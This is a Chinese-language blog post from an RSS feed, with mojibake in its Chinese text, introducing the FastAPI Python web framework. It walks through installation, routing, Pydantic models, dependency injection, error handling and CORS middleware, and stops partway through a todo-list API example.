</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥æµ…å‡ºFastAPIï¼šç°ä»£Python Webå¼€å‘çš„åˆ©å™¨]]></title>    <link>https://juejin.cn/post/7600333405979410473</link>    <guid>https://juejin.cn/post/7600333405979410473</guid>    <pubDate>2026-01-29T05:43:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600333405979410473" data-draft-id="7600491179499094070" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥æµ…å‡ºFastAPIï¼šç°ä»£Python Webå¼€å‘çš„åˆ©å™¨"/> <meta itemprop="keywords" content="åç«¯,Python"/> <meta itemprop="datePublished" content="2026-01-29T05:43:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è¯¸ç¥ç¼„é»˜ä¸è¯­"/> <meta itemprop="url" content="https://juejin.cn/user/2036746568087502"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥æµ…å‡ºFastAPIï¼šç°ä»£Python Webå¼€å‘çš„åˆ©å™¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2036746568087502/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è¯¸ç¥ç¼„é»˜ä¸è¯­
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T05:43:31.000Z" title="Thu Jan 29 2026 05:43:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2FPolarisRisingWar%2Farticle%2Fdetails%2F116396744" target="_blank" title="https://blog.csdn.net/PolarisRisingWar/article/details/116396744" ref="nofollow noopener noreferrer">è¯¸ç¥ç¼„é»˜ä¸è¯­-ä¸ªäººæŠ€æœ¯åšæ–‡ä¸è§†é¢‘ç›®å½•</a></p>
<p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ffastapi.tiangolo.com%2F" target="_blank" title="https://fastapi.tiangolo.com/" ref="nofollow noopener noreferrer">FastAPI</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fpypi.org%2Fproject%2Ffastapi%2F" target="_blank" title="https://pypi.org/project/fastapi/" ref="nofollow noopener noreferrer">fastapi Â· PyPI</a></p>
<blockquote>
<p>è¿˜åœ¨ä¸ºPython Webå¼€å‘çš„é€Ÿåº¦å’Œæ€§èƒ½å‘æ„ï¼ŸFastAPIæˆ–è®¸æ˜¯ä½ ä¸€ç›´åœ¨å¯»æ‰¾çš„è§£å†³æ–¹æ¡ˆï¼</p>
</blockquote>
<h2 data-id="heading-0">ä»€ä¹ˆæ˜¯FastAPIï¼Ÿ</h2>
<p>FastAPIæ˜¯ä¸€ä¸ªç°ä»£ã€å¿«é€Ÿï¼ˆé«˜æ€§èƒ½ï¼‰çš„Python Webæ¡†æ¶ï¼Œä¸“é—¨ç”¨äºæ„å»ºAPIã€‚å®ƒåŸºäºæ ‡å‡†Pythonç±»å‹æç¤ºï¼Œä½¿ç”¨Python 3.6+ç‰ˆæœ¬çš„ç±»å‹æç¤ºç‰¹æ€§ï¼Œè®©APIå¼€å‘å˜å¾—ç®€å•è€Œå¼ºå¤§ã€‚</p>
<h2 data-id="heading-1">FastAPIçš„æ ¸å¿ƒä¼˜åŠ¿</h2>
<ul>
<li>âš¡ <strong>æå¿«çš„æ€§èƒ½</strong>ï¼šä¸NodeJSå’ŒGoç›¸å½“ï¼Œæ˜¯Pythoné¢†åŸŸæœ€å¿«çš„æ¡†æ¶ä¹‹ä¸€</li>
<li>ğŸš€ <strong>é«˜æ•ˆçš„ç¼–ç </strong>ï¼šå¼€å‘é€Ÿåº¦æå‡çº¦200%-300%</li>
<li>ğŸ“ <strong>æ›´å°‘çš„bug</strong>ï¼šå‡å°‘çº¦40%çš„äººä¸ºé”™è¯¯</li>
<li>ğŸ’¡ <strong>ç›´è§‚çš„API</strong>ï¼šå¼ºå¤§çš„ç¼–è¾‘å™¨æ”¯æŒï¼Œè‡ªåŠ¨è¡¥å…¨æ— å¤„ä¸åœ¨</li>
<li>ğŸ“š <strong>å®Œæ•´çš„æ ‡å‡†</strong>ï¼šåŸºäºå¹¶å®Œå…¨å…¼å®¹å¼€æ”¾çš„APIæ ‡å‡†ï¼ˆOpenAPIå’ŒJSON Schemaï¼‰</li>
</ul>
<h2 data-id="heading-2">å®‰è£…FastAPI</h2>
<pre><code class="hljs language-bash" lang="bash">pip install <span class="hljs-string">"fastapi[standard]"</span>
</code></pre>
<h2 data-id="heading-3">ç¬¬ä¸€ä¸ªFastAPIåº”ç”¨</h2>
<p>è®©æˆ‘ä»¬ä»ä¸€ä¸ªç®€å•çš„"Hello World"å¼€å§‹ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI

<span class="hljs-comment"># åˆ›å»ºFastAPIå®ä¾‹</span>
app = FastAPI()

<span class="hljs-comment"># å®šä¹‰æ ¹è·¯å¾„çš„è·¯ç”±</span>
<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">read_root</span>():
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"message"</span>: <span class="hljs-string">"Hello World"</span>}

<span class="hljs-comment"># å¸¦è·¯å¾„å‚æ•°çš„è·¯ç”±</span>
<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/items/{item_id}"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">read_item</span>(<span class="hljs-params">item_id: <span class="hljs-built_in">int</span>, q: <span class="hljs-built_in">str</span> = <span class="hljs-literal">None</span></span>):
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"item_id"</span>: item_id, <span class="hljs-string">"q"</span>: q}
</code></pre>
<p>ä¿å­˜ä¸º <code>try1.py</code>ï¼Œç„¶åè¿è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">python -m uvicorn try1:app --reload
</code></pre>
<p>è®¿é—® <code>http://127.0.0.1:8000</code>ï¼Œä½ å°†çœ‹åˆ°JSONå“åº”ï¼š<code>{"message": "Hello World"}</code></p>
<p>uvicornä¹Ÿå¯ä»¥ä½¿ç”¨Pythonè„šæœ¬è¿è¡Œï¼š
åˆ›å»ºä¸€ä¸ª try2.py æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> uvicorn

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    uvicorn.run(<span class="hljs-string">"try1:app"</span>, host=<span class="hljs-string">"127.0.0.1"</span>, port=<span class="hljs-number">8000</span>, reload=<span class="hljs-literal">True</span>)
</code></pre>
<p>ç„¶åè¿è¡Œï¼š</p>
<pre><code class="hljs">python try2.py
</code></pre>
<h2 data-id="heading-4">è‡ªåŠ¨APIæ–‡æ¡£</h2>
<p>FastAPIæœ€é…·çš„ç‰¹æ€§ä¹‹ä¸€å°±æ˜¯è‡ªåŠ¨ç”Ÿæˆäº¤äº’å¼APIæ–‡æ¡£ï¼</p>
<ul>
<li><strong>Swagger UI</strong>: <a href="https://link.juejin.cn?target=http%3A%2F%2F127.0.0.1%3A8000%2Fdocs" target="_blank" title="http://127.0.0.1:8000/docs" ref="nofollow noopener noreferrer">http://127.0.0.1:8000/docs</a></li>
<li><strong>ReDoc</strong>: <a href="https://link.juejin.cn?target=http%3A%2F%2F127.0.0.1%3A8000%2Fredoc" target="_blank" title="http://127.0.0.1:8000/redoc" ref="nofollow noopener noreferrer">http://127.0.0.1:8000/redoc</a></li>
</ul>
<p>è¿™äº›æ–‡æ¡£æ˜¯å®Œå…¨äº¤äº’çš„ï¼Œä½ å¯ä»¥ç›´æ¥åœ¨æµè§ˆå™¨ä¸­æµ‹è¯•APIï¼</p>
<p>ç”±äºç½‘ç»œé—®é¢˜ï¼Œå¯èƒ½æ‰“å¼€åæ— æ³•æ˜¾ç¤ºå†…å®¹ï¼Œå¯ä»¥åœ¨F12ä¸­çœ‹åˆ°éœ€è¦ä»å¤–ç½‘ä¸‹jsï¼š
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/86cb9cd4da764d13b49aac0e550f66bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K-456We57yE6buY5LiN6K-t:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270213&amp;x-signature=Ttyazsag8IeoNOtuuY0vjM6c7SI%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h2 data-id="heading-5">æ·±å…¥FastAPIç‰¹æ€§</h2>
<h3 data-id="heading-6">1. ç±»å‹æç¤ºå’Œæ•°æ®éªŒè¯</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Optional</span>
<span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel

<span class="hljs-comment"># å®šä¹‰æ•°æ®æ¨¡å‹</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Item</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    name: <span class="hljs-built_in">str</span>
    description: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>] = <span class="hljs-literal">None</span>
    price: <span class="hljs-built_in">float</span>
    tax: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">float</span>] = <span class="hljs-literal">None</span>

<span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">"/items/"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_item</span>(<span class="hljs-params">item: Item</span>):
    item_dict = item.<span class="hljs-built_in">dict</span>()
    <span class="hljs-keyword">if</span> item.tax:
        price_with_tax = item.price + item.tax
        item_dict.update({<span class="hljs-string">"price_with_tax"</span>: price_with_tax})
    <span class="hljs-keyword">return</span> item_dict
</code></pre>
<h3 data-id="heading-7">2. è·¯å¾„å‚æ•°å’ŒæŸ¥è¯¢å‚æ•°</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> enum <span class="hljs-keyword">import</span> Enum

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ModelName</span>(<span class="hljs-built_in">str</span>, Enum):
    alexnet = <span class="hljs-string">"alexnet"</span>
    resnet = <span class="hljs-string">"resnet"</span>
    lenet = <span class="hljs-string">"lenet"</span>

<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/models/{model_name}"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_model</span>(<span class="hljs-params">model_name: ModelName</span>):
    <span class="hljs-keyword">if</span> model_name == ModelName.alexnet:
        <span class="hljs-keyword">return</span> {<span class="hljs-string">"model_name"</span>: model_name, <span class="hljs-string">"message"</span>: <span class="hljs-string">"Deep Learning FTW!"</span>}
    
    <span class="hljs-keyword">if</span> model_name.value == <span class="hljs-string">"lenet"</span>:
        <span class="hljs-keyword">return</span> {<span class="hljs-string">"model_name"</span>: model_name, <span class="hljs-string">"message"</span>: <span class="hljs-string">"LeCNN all the images"</span>}
    
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"model_name"</span>: model_name, <span class="hljs-string">"message"</span>: <span class="hljs-string">"Have some residuals"</span>}

<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/users/"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">read_users</span>(<span class="hljs-params">skip: <span class="hljs-built_in">int</span> = <span class="hljs-number">0</span>, limit: <span class="hljs-built_in">int</span> = <span class="hljs-number">10</span>, q: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>] = <span class="hljs-literal">None</span></span>):
    <span class="hljs-comment"># æ¨¡æ‹Ÿä»æ•°æ®åº“è·å–ç”¨æˆ·</span>
    users = [{<span class="hljs-string">"id"</span>: i, <span class="hljs-string">"name"</span>: <span class="hljs-string">f"User <span class="hljs-subst">{i}</span>"</span>} <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>)]
    
    <span class="hljs-keyword">if</span> q:
        users = [user <span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> users <span class="hljs-keyword">if</span> q.lower() <span class="hljs-keyword">in</span> user[<span class="hljs-string">"name"</span>].lower()]
    
    <span class="hljs-keyword">return</span> users[skip: skip + limit]
</code></pre>
<h3 data-id="heading-8">3. è¯·æ±‚ä½“å’Œå¤æ‚æ•°æ®æ¨¡å‹</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    <span class="hljs-built_in">id</span>: <span class="hljs-built_in">int</span>
    name: <span class="hljs-built_in">str</span> = <span class="hljs-string">"John Doe"</span>
    signup_ts: <span class="hljs-type">Optional</span>[datetime] = <span class="hljs-literal">None</span>
    friends: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>] = []

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ComplexData</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    user: User
    items: <span class="hljs-type">List</span>[Item]

<span class="hljs-meta">@app.put(<span class="hljs-params"><span class="hljs-string">"/complex-data/{data_id}"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">update_complex_data</span>(<span class="hljs-params">data_id: <span class="hljs-built_in">int</span>, data: ComplexData</span>):
    <span class="hljs-keyword">return</span> {
        <span class="hljs-string">"data_id"</span>: data_id,
        <span class="hljs-string">"data"</span>: data.<span class="hljs-built_in">dict</span>(),
        <span class="hljs-string">"received_at"</span>: datetime.now()
    }
</code></pre>
<h3 data-id="heading-9">4. ä¾èµ–æ³¨å…¥ç³»ç»Ÿ</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> Depends, HTTPException, status

<span class="hljs-comment"># ç®€å•çš„ä¾èµ–</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">common_parameters</span>(<span class="hljs-params">
    skip: <span class="hljs-built_in">int</span> = <span class="hljs-number">0</span>, 
    limit: <span class="hljs-built_in">int</span> = <span class="hljs-number">100</span>,
    q: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>] = <span class="hljs-literal">None</span>
</span>):
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"skip"</span>: skip, <span class="hljs-string">"limit"</span>: limit, <span class="hljs-string">"q"</span>: q}

<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/items/"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">read_items</span>(<span class="hljs-params">commons: <span class="hljs-built_in">dict</span> = Depends(<span class="hljs-params">common_parameters</span>)</span>):
    <span class="hljs-keyword">return</span> commons

<span class="hljs-comment"># æ›´å¤æ‚çš„ä¾èµ–æ³¨å…¥ç¤ºä¾‹</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Database</span>:
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user</span>(<span class="hljs-params">self, user_id: <span class="hljs-built_in">int</span></span>):
        <span class="hljs-comment"># æ¨¡æ‹Ÿæ•°æ®åº“æŸ¥è¯¢</span>
        <span class="hljs-keyword">return</span> {<span class="hljs-string">"user_id"</span>: user_id, <span class="hljs-string">"name"</span>: <span class="hljs-string">f"User <span class="hljs-subst">{user_id}</span>"</span>}

<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_database</span>():
    <span class="hljs-keyword">return</span> Database()

<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_current_user</span>(<span class="hljs-params">
    user_id: <span class="hljs-built_in">int</span>, 
    db: Database = Depends(<span class="hljs-params">get_database</span>)
</span>):
    user = <span class="hljs-keyword">await</span> db.get_user(user_id)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user:
        <span class="hljs-keyword">raise</span> HTTPException(status_code=<span class="hljs-number">404</span>, detail=<span class="hljs-string">"User not found"</span>)
    <span class="hljs-keyword">return</span> user

<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/users/me"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">read_current_user</span>(<span class="hljs-params">current_user: <span class="hljs-built_in">dict</span> = Depends(<span class="hljs-params">get_current_user</span>)</span>):
    <span class="hljs-keyword">return</span> current_user
</code></pre>
<h3 data-id="heading-10">5. é”™è¯¯å¤„ç†</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> HTTPException
<span class="hljs-keyword">from</span> fastapi.responses <span class="hljs-keyword">import</span> JSONResponse

<span class="hljs-comment"># è‡ªå®šä¹‰å¼‚å¸¸å¤„ç†å™¨</span>
<span class="hljs-meta">@app.exception_handler(<span class="hljs-params">HTTPException</span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">http_exception_handler</span>(<span class="hljs-params">request, exc</span>):
    <span class="hljs-keyword">return</span> JSONResponse(
        status_code=exc.status_code,
        content={<span class="hljs-string">"message"</span>: exc.detail, <span class="hljs-string">"error"</span>: <span class="hljs-literal">True</span>}
    )

<span class="hljs-comment"># æŠ›å‡ºHTTPå¼‚å¸¸</span>
<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/protected-route"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">protected_route</span>(<span class="hljs-params">token: <span class="hljs-built_in">str</span> = <span class="hljs-literal">None</span></span>):
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> token <span class="hljs-keyword">or</span> token != <span class="hljs-string">"secret-token"</span>:
        <span class="hljs-keyword">raise</span> HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail=<span class="hljs-string">"Invalid authentication credentials"</span>,
            headers={<span class="hljs-string">"WWW-Authenticate"</span>: <span class="hljs-string">"Bearer"</span>},
        )
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"message"</span>: <span class="hljs-string">"Access granted"</span>}
</code></pre>
<h3 data-id="heading-11">6. ä¸­é—´ä»¶å’ŒCORS</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi.middleware.cors <span class="hljs-keyword">import</span> CORSMiddleware
<span class="hljs-keyword">import</span> time

<span class="hljs-comment"># æ·»åŠ CORSä¸­é—´ä»¶</span>
app.add_middleware(
    CORSMiddleware,
    allow_origins=[<span class="hljs-string">"*"</span>],  <span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒä¸­åº”è¯¥æŒ‡å®šå…·ä½“åŸŸå</span>
    allow_credentials=<span class="hljs-literal">True</span>,
    allow_methods=[<span class="hljs-string">"*"</span>],
    allow_headers=[<span class="hljs-string">"*"</span>],
)

<span class="hljs-comment"># è‡ªå®šä¹‰ä¸­é—´ä»¶ï¼šæ·»åŠ å¤„ç†æ—¶é—´å¤´</span>
<span class="hljs-meta">@app.middleware(<span class="hljs-params"><span class="hljs-string">"http"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_process_time_header</span>(<span class="hljs-params">request, call_next</span>):
    start_time = time.time()
    response = <span class="hljs-keyword">await</span> call_next(request)
    process_time = time.time() - start_time
    response.headers[<span class="hljs-string">"X-Process-Time"</span>] = <span class="hljs-built_in">str</span>(process_time)
    <span class="hljs-keyword">return</span> response
</code></pre>
<h2 data-id="heading-12">å®Œæ•´ç¤ºä¾‹ï¼šå¾…åŠäº‹é¡¹API</h2>
<p>è®©æˆ‘ä»¬æ„å»ºä¸€ä¸ªå®Œæ•´çš„å¾…åŠäº‹é¡¹ç®¡ç†APIï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, HTTPException, Depends
<span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Optional</span>
<span class="hljs-keyword">from</span> uuid <span class="hljs-keyword">import</span> UUID, uuid4

app = FastAPI(title=<span class="hljs-string">"Todo API"</span>, version=<span class="hljs-string">"1.0.0"</span>)

<span class="hljs-comment"># æ•°æ®æ¨¡å‹</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">TodoItem</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    <span class="hljs-built_in">id</span>: <span class="hljs-type">Optional</span>[UUID] = <span class="hljs-literal">None</span>
    title: <span class="hljs-built_in">str</span>
    description: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>] = <span class="hljs-literal">None</span>
    completed: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>

<span class="hljs-comment"># æ¨¡æ‹Ÿæ•°æ®åº“</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">TodoDB</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.todos: <span class="hljs-type">List</span>[TodoItem] = []
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_all</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-type">List</span>[TodoItem]:
        <span class="hljs-keyword">return</span> self.todos
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self, todo_id: UUID</span>) -&gt; <span class="hljs-type">Optional</span>[TodoItem]:
        <span class="hljs-keyword">for</span> todo <span class="hljs-keyword">in</span> self.todos:
            <span class="hljs-keyword">if</span> todo.<span class="hljs-built_in">id</span> == todo_id:
                <span class="hljs-keyword">return</span> todo
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">self, todo: TodoItem</span>) -&gt; TodoItem:
        todo.<span class="hljs-built_in">id</span> = uuid4()
        self.todos.append(todo)
        <span class="hljs-keyword">return</span> todo
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">self, todo_id: UUID, updated_todo: TodoItem</span>) -&gt; <span class="hljs-type">Optional</span>[TodoItem]:
        <span class="hljs-keyword">for</span> idx, todo <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(self.todos):
            <span class="hljs-keyword">if</span> todo.<span class="hljs-built_in">id</span> == todo_id:
                updated_todo.<span class="hljs-built_in">id</span> = todo_id
                self.todos[idx] = updated_todo
                <span class="hljs-keyword">return</span> updated_todo
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    
